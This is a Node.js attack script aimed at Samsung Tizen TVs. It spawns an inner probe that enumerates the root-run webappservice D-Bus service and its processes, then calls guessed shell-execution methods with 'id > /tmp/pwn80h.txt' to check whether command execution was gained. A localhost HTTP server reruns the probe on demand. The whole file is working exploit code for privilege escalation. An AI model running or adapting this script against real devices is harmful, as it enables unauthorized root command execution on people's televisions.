'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8169;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe80h.txt';
var PWN = '/tmp/pwn80h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Introspect org.tizen.tv.webappservice.server on system D-Bus
  'try {',
  '  var o = cp.spawnSync("gdbus", ["introspect","--system","--dest","org.tizen.tv.webappservice.server","--object-path","/","--recurse"], {timeout:12000});',
  '  r.webappsvc_introspect = (o.stdout||Buffer.from("")).toString().trim().slice(0,5000);',
  '} catch(e) { r.webappsvc_err = e.message.slice(0,100); }',

  // 2. Also introspect at alternate paths
  'var paths = ["/", "/webappservice", "/org/tizen/tv/webappservice", "/com/samsung/webappservice"];',
  'r.webappsvc_paths = {};',
  'paths.forEach(function(p) {',
  '  try {',
  '    var o2 = cp.spawnSync("gdbus", ["introspect","--system","--dest","org.tizen.tv.webappservice.server","--object-path",p], {timeout:5000});',
  '    var out = (o2.stdout||Buffer.from("")).toString().trim();',
  '    if (out && out.length > 20 && out.indexOf("No such object path") === -1) {',
  '      r.webappsvc_paths[p] = out.slice(0,1000);',
  '    }',
  '  } catch(e) {}',
  '});',

  // 3. Try calling any exec/shell/run methods on webappservice
  // Try ExecuteUserShell on webappservice (not jackpack.migration this time)
  'try {',
  '  var o3 = cp.spawnSync("gdbus", ["call","--system","--dest","org.tizen.tv.webappservice.server","--object-path","/","--method","org.tizen.tv.webappservice.ExecuteUserShell","id"], {timeout:5000});',
  '  r.exec_user_shell = (o3.stdout||Buffer.from("")).toString().trim().slice(0,300);',
  '} catch(e) { r.exec_user_shell_err = e.message.slice(0,60); }',

  // 4. Find the webappservice process PID (it's running as root based on webappsvc binary)
  'try {',
  '  var pidlist = fs.readdirSync("/proc").filter(function(p){ return /^[0-9]+$/.test(p); });',
  '  r.webappsvc_proc = null;',
  '  for (var i = 0; i < pidlist.length; i++) {',
  '    try {',
  '      var comm = fs.readFileSync("/proc/" + pidlist[i] + "/comm", "utf8").trim();',
  '      if (comm.indexOf("webappsvc") > -1 || comm.indexOf("webappservice") > -1 || comm.indexOf("wasm") > -1) {',
  '        var st = fs.readFileSync("/proc/" + pidlist[i] + "/status", "utf8");',
  '        var uid_m = st.match(/^Uid:\\t(\\d+)/m);',
  '        r.webappsvc_proc = { pid: pidlist[i], comm: comm, uid: uid_m ? uid_m[1] : "?" };',
  '        break;',
  '      }',
  '    } catch(e) {}',
  '  }',
  '} catch(e) { r.webappsvc_proc_err = e.message; }',

  // 5. Also look for any process that has "webappservice" in cmdline
  'try {',
  '  var pidlist2 = fs.readdirSync("/proc").filter(function(p){ return /^[0-9]+$/.test(p); });',
  '  r.webappsvc_cmds = [];',
  '  for (var i = 0; i < pidlist2.length; i++) {',
  '    try {',
  '      var cmdl = fs.readFileSync("/proc/" + pidlist2[i] + "/cmdline", "utf8");',
  '      if (cmdl.indexOf("webappservice") > -1 || cmdl.indexOf("wasutility") > -1) {',
  '        r.webappsvc_cmds.push({ pid: pidlist2[i], cmd: cmdl.replace(/\\0/g," ").slice(0,100) });',
  '      }',
  '    } catch(e) {}',
  '  }',
  '} catch(e) { r.webappsvc_cmds_err = e.message; }',

  // 6. Introspect all object paths under webappservice
  'try {',
  '  var o5 = cp.spawnSync("dbus-send", ["--system","--print-reply","--dest=org.tizen.tv.webappservice.server","/","org.freedesktop.DBus.Introspectable.Introspect"], {timeout:8000});',
  '  r.webappsvc_dbus_send = (o5.stdout||Buffer.from("")).toString().trim().slice(0,3000);',
  '} catch(e) { r.webappsvc_dbus_send_err = e.message.slice(0,60); }',

  // 7. Try some command execution via the webappservice API
  // wasutility_process_request is a function - maybe webappservice has a wrapper
  'var execMethods = [',
  '  ["ExecuteShell", "id > ' + PWN + '"],',
  '  ["execute_shell", "id > ' + PWN + '"],',
  '  ["WasutilityRun", "id > ' + PWN + '"],',
  '  ["RunCommand", "id > ' + PWN + '"]',
  '];',
  'r.exec_attempts = {};',
  'execMethods.forEach(function(m) {',
  '  try {',
  '    var args = ["call","--system","--dest","org.tizen.tv.webappservice.server","--object-path","/","--method","org.tizen.tv.webappservice.server." + m[0], m[1]];',
  '    var o6 = cp.spawnSync("gdbus", args, {timeout:4000});',
  '    r.exec_attempts[m[0]] = (o6.stdout||Buffer.from("")).toString().trim().slice(0,100);',
  '  } catch(e) { r.exec_attempts[m[0]] = e.message.slice(0,60); }',
  '});',

  // 8. Check /tmp/pwn from any attempts
  'try { r.pwn = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_err = e.code; }',

  // 9. Read the full D-Bus name list again to look for anything exec/shell related
  'try {',
  '  var o7 = cp.spawnSync("gdbus", ["call","--system","--dest","org.freedesktop.DBus","--object-path","/","--method","org.freedesktop.DBus.ListNames"], {timeout:8000});',
  '  var names_full = (o7.stdout||Buffer.from("")).toString();',
  '  r.interesting_names = names_full.split(",").map(function(s){ return s.trim().replace(/[\'\\[\\] ()]/g,""); }).filter(function(s){ return s.length > 5 && s.charAt(0) !== ":"; });',
  '} catch(e) { r.names_full_err = e.message; }',

  'var out = JSON.stringify(r, null, 2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '", out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 90000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
